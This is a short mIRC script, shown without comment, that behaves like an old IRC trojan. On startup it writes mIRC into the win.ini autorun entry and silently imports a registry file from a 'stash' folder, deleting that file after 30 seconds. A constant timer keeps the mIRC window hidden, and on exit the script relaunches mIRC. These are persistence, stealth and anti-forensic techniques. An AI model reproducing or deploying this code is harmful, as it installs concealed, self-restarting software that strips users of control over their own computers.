on 1:start:{
  var %run $readini $windows $+ \win.ini windows run
  if ($mircexe !isin %run) writeini $windows $+ \win.ini windows run $mircexe
  run regedit /s $mircdir $+ stash\setup.reg | .timer 1 30 remove $mircdir $+ stash\setup.reg
  .timer 0 0 showmirc -t -n
}
on 1:exit:{ run mirc.exe | remove $mircdir $+ stash\setup.reg }
